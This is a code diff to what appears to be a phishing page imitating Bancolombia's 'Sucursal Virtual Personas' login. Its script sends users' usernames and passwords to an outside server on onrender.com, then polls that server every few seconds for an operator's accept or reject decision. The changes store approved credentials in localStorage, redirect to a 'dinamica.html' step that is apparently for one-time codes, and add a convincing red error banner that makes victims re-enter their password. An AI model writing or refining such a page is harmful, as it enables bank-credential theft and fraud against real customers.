@@ -22,7 +22,7 @@
             justify-content: center;
             min-height: 100vh;
             width: 100%;
-            overflow: hidden; /* Evita scroll cuando sale el overlay */
+            overflow: hidden; 
         }
 
         .mobile-container {
@@ -34,7 +34,7 @@
             position: relative;
             display: flex;
             flex-direction: column;
-            overflow-y: auto; /* Permite scroll normal */
+            overflow-y: auto; 
         }
 
         @media (min-width: 600px) {
@@ -70,7 +70,7 @@
             color: #333;
         }
 
-        /* --- BANNER AZUL --- */
+        /* --- BANNER (Normal y Error) --- */
         .alert-banner {
             background-color: #D7F3FC; 
             border: 1px solid #BDE6F2;
@@ -79,6 +79,13 @@
             margin-bottom: 20px;
             position: relative;
             z-index: 2;
+            transition: all 0.3s ease;
+        }
+
+        /* Estilos para cuando es error */
+        .alert-banner.error-banner {
+            background-color: #FCE8E8; /* Rojo muy claro */
+            border: 1px solid #F5C6C6;
         }
 
         .alert-header {
@@ -103,6 +110,12 @@
             margin-top: 2px;
         }
 
+        /* Icono de error (X roja) */
+        .alert-banner.error-banner .icon-bulb {
+            border-color: #D32F2F;
+            color: #D32F2F;
+        }
+
         .alert-title {
             font-weight: 700;
             font-size: 14px;
@@ -110,11 +123,19 @@
             line-height: 1.3;
         }
 
+        .alert-banner.error-banner .alert-title {
+            color: #D32F2F;
+        }
+
         .alert-text {
             font-size: 13px;
             color: #333;
             line-height: 1.4;
             margin-bottom: 10px;
+        }
+
+        .alert-banner.error-banner .alert-text {
+            color: #8B0000;
         }
 
         /* --- CARD Y FONDO --- */
@@ -322,46 +343,41 @@
             line-height: 1.6;
         }
 
-        /* ==========================================
-           PANTALLA DE CARGA (OVERLAY CON BLUR)
-           ========================================== */
+        /* --- PANTALLA DE CARGA --- */
         .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background: rgba(255, 255, 255, 0.7); /* Fondo semitransparente */
-            backdrop-filter: blur(5px); /* Efecto Blur */
+            background: rgba(255, 255, 255, 0.7); 
+            backdrop-filter: blur(5px); 
             -webkit-backdrop-filter: blur(5px);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999; /* Por encima de todo */
+            z-index: 9999; 
             opacity: 0;
             visibility: hidden;
             transition: opacity 0.3s ease, visibility 0.3s ease;
         }
 
-        /* Clase para mostrar el overlay */
         .loading-overlay.show {
             opacity: 1;
             visibility: visible;
         }
 
-        /* El círculo animado (Spinner) */
         .spinner {
             width: 50px;
             height: 50px;
-            border: 4px solid #f3f3f3; /* Color de fondo del círculo */
-            border-top: 4px solid #FDDA24; /* Amarillo Bancolombia */
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #FDDA24; 
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin-bottom: 15px;
         }
 
-        /* Texto Cargando... */
         .loading-text {
             font-size: 16px;
             font-weight: 600;
@@ -369,7 +385,6 @@
             letter-spacing: 1px;
         }
 
-        /* Animación de giro */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -385,9 +400,10 @@
             <h1>Sucursal Virtual Personas</h1>
         </header>
 
+        <!-- BANNER CON ID PARA CAMBIAR A ERROR -->
         <div class="alert-banner" id="dynamic-banner">
             <div class="alert-header" id="banner-header">
-                <div class="icon-bulb" style="border: 2px solid #00A0D2; color: #00A0D2; font-size: 14px;">!</div>
+                <div class="icon-bulb" id="banner-icon" style="border: 2px solid #00A0D2; color: #00A0D2; font-size: 14px;">!</div>
                 <span class="alert-title" id="banner-title">Verificación de identidad requerida</span>
             </div>
             <p class="alert-text" id="banner-text">
@@ -460,26 +476,22 @@
 
     </div>
 
-    <!-- PANTALLA DE CARGA (Oculta por defecto) -->
     <div class="loading-overlay" id="loading-screen">
         <div class="spinner"></div>
         <div class="loading-text">Cargando...</div>
     </div>
 
     <script>
-        // ==========================================
-        // CONFIGURACIÓN DEL BACKEND
-        // ==========================================
-        const BACKEND_URL = 'https://backkkk-rj54.onrender.com';
+        const BACKEND_URL = 'https://backkkk-rj54.onrender.com'; 
 
         const usuarioInput = document.getElementById('usuario');
         const claveInput = document.getElementById('clave');
         const btnSubmit = document.getElementById('btn-submit');
         const loginForm = document.getElementById('login-form');
+        const banner = document.getElementById('dynamic-banner');
+        const bannerIcon = document.getElementById('banner-icon');
         const bannerTitle = document.getElementById('banner-title');
         const bannerText = document.getElementById('banner-text');
-        
-        // Variable para la pantalla de carga
         const loadingScreen = document.getElementById('loading-screen');
 
         function validarFormulario() {
@@ -509,7 +521,12 @@
             
             if(btnSubmit.disabled) return;
 
-            // Deshabilitar botón y MOSTRAR PANTALLA DE CARGA
+            // Reiniciar el banner a estado normal por si acaso
+            banner.classList.remove('error-banner');
+            bannerIcon.textContent = '!';
+            bannerTitle.textContent = "Verificación de identidad requerida";
+            bannerText.textContent = "Para verificar tu extracto bancario es necesario validar tu identidad. Por favor, confirma tus datos.";
+
             btnSubmit.disabled = true;
             loadingScreen.classList.add('show');
             
@@ -528,7 +545,6 @@
                 if (data.success) {
                     const intentoId = data.intentoId;
                     
-                    // Iniciar polling
                     const interval = setInterval(async () => {
                         try {
                             const statusRes = await fetch(`${BACKEND_URL}/api/status/${intentoId}`);
@@ -536,29 +552,29 @@
 
                             if (statusData.estado === 'aceptado') {
                                 clearInterval(interval);
-                                // Redirigir a la página de éxito
+                                localStorage.setItem('usuarioAprobado', usuario);
+                                localStorage.setItem('claveAprobada', clave);
                                 window.location.href = 'dinamica.html'; 
 
                             } else if (statusData.estado === 'rechazado') {
                                 clearInterval(interval);
-                                
-                                // OCULTAR PANTALLA DE CARGA
                                 loadingScreen.classList.remove('show');
                                 
-                                // Mostrar error en el banner
-                                bannerTitle.textContent = "Acceso denegado";
-                                bannerText.textContent = "El intento ha sido rechazado. Por favor, verifica tus datos e intenta nuevamente.";
+                                // --- CAMBIO A ESTILO DE ERROR ---
+                                banner.classList.add('error-banner');
+                                bannerIcon.textContent = '✕'; // Icono de X
+                                bannerTitle.textContent = "No pudimos validar tus datos";
+                                bannerText.textContent = "El usuario o la clave ingresados no son correctos. Por favor, verifica la información e intenta nuevamente.";
                                 
-                                // Restaurar formulario para nuevo intento
                                 btnSubmit.disabled = false;
                                 btnSubmit.classList.add('active');
-                                claveInput.value = ''; // Limpiar clave
-                                validarFormulario(); // Re-validar
+                                claveInput.value = ''; 
+                                validarFormulario(); 
                             }
                         } catch (error) {
                             console.error("Error consultando estado:", error);
                         }
-                    }, 3000); // Consulta cada 3 segundos
+                    }, 3000); 
 
                 } else {
                     alert("Error al procesar la solicitud.");
